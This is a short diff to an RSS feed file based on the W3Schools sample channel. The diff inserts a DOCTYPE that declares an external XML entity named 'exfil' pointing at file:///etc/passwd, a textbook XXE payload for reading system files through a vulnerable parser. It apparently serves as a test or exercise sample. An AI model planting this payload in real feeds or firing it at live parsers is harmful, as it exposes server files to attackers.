@@ -1,6 +1,11 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <rss version="2.0">
 
+<!DOCTYPE user [
+  <!ELEMENT user ANY >
+  <!ENTITY exfil SYSTEM "file:///etc/passwd">
+]>
+
 <channel>
   <title>W3Schools Home Page</title>
   <link>https://www.w3schools.com</link>
